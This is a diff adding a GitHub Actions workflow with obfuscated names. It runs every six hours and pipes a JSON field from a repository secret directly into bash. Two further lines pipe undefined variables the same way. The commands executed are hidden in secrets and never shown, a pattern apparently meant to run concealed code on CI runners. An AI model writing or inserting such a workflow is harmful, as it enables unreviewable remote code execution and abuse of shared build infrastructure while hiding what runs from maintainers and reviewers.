@@ -1,0 +1,18 @@
+name: muhong19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: muhong19871010
+        env:
+          npz9: ${{ secrets.npz9 }}
+        run: |
+          echo $npz9 | jq -r .bo15801 | /bin/bash
+          echo $zcdjz5071 | jq -r .kfwoa891 | /bin/bash
+          echo $n220 | jq -r .nvxmm19 | /bin/bash
+
